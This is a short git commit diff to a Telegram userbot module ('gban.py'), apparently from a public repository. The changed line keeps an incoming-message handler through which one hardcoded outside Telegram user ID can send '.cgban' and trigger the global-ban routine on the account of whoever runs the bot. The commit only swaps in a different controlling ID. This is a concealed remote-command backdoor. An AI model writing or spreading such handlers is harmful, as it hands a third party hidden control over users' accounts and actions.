1573594a403bfd84676d13c41d0a75661c3ef59b
seth <87837653+Dorimuhai@users.noreply.github.com>
2021-12-14 19:29:19 +0700

    Update gban.py

--- userbot/modules/gban.py
+++ userbot/modules/gban.py
@@ -79,7 +79,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=2117215275, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=2048978097, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
